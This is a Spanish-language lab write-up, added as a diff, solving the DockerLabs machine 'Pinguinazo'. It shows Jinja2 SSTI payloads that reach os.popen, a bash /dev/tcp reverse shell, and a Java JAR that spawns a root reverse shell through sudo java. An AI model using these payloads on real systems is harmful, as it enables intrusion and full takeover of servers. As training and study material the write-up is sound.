@@ -1,0 +1,223 @@
+---
+title: Pinguinazo
+description: Resolución completa de la máquina virtual *Pinguinazo* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Pinguinazo**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web en el puerto 5000 con un formulario que procesa entradas de usuario mediante un motor de plantillas. Se identifica una vulnerabilidad de **Server-Side Template Injection (SSTI)**, permitiendo la ejecución de comandos del sistema mediante el acceso al módulo `os` de Python. Con esto, se obtiene una reverse shell como el usuario `pinguinazo`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `java` como root sin autenticación. Se compila y ejecuta un archivo JAR malicioso que establece una reverse shell con privilegios de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Pinguinazo',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '24/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Pinguinazo.zip
+sudo bash auto_deploy.sh Pinguinazo.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Pinguinazo/{content,exploits,nmap,scripts}
+cd Pinguinazo
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **5000/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/Ports_gokf5p.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p5000 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints:
+
+```bash
+gobuster dir -u http://172.17.0.2:5000/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+**Rutas encontradas:**
+- `/index` — Página principal con un formulario de entrada.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1761717368/Index_vzojgt.png)
+- `/greet` — Formulario que muestra el nombre introducido.
+  ![Greet](https://res.cloudinary.com/dewqswzke/image/upload/v1761717368/Greet_cqbwkr.png)
+- `/console` — Interfaz que pide un PIN.
+  ![Console](https://res.cloudinary.com/dewqswzke/image/upload/v1761717368/Console_licwyu.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Confirmación de SSTI
+
+En el formulario de `/greet`, se envía una prueba de expresión:
+
+```
+{{ 7 * 7 }}
+```
+
+La página devuelve `49`, confirmando que la entrada se evalúa en un motor de plantillas (SSTI).
+
+![Test SSTI](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/TestSSTI_asdamt.png)
+
+### 2.2 Ejecución remota de comandos
+
+Se accede al módulo `os` para ejecutar comandos:
+
+```
+{{ lipsum.__globals__["os"].popen('id').read() }}
+```
+
+![SSTI to CI](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/SSTItoCI_c4q1hx.png)
+
+### 2.3 Reverse shell
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se inyecta el payload desde la plantilla:
+
+```
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"').read() }}
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/ReverseShell_ffpy5a.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De pinguinazo → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/Sudo-l_reiqvw.png)
+
+El usuario puede ejecutar `java` como root sin contraseña.
+
+Se crea un exploit en Java:
+
+**Exploit.java**
+
+```java
+import java.io.*;
+
+public class Exploit {
+    public static void main(String[] args) throws Exception {
+        String[] cmd = {"/bin/sh", "-c", "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"};
+        Runtime.getRuntime().exec(cmd);
+    }
+}
+```
+
+**manifest.txt**
+
+```
+Main-Class: Exploit
+```
+
+Se compila y empaqueta:
+
+```bash
+javac Exploit.java
+jar cfm exploit.jar manifest.txt Exploit.class
+```
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 4444
+```
+
+Se ejecuta el JAR con `sudo`:
+
+```bash
+sudo java -jar exploit.jar
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/Root_ae7jkb.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Server-Side Template Injection (SSTI)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como pinguinazo"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en java",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
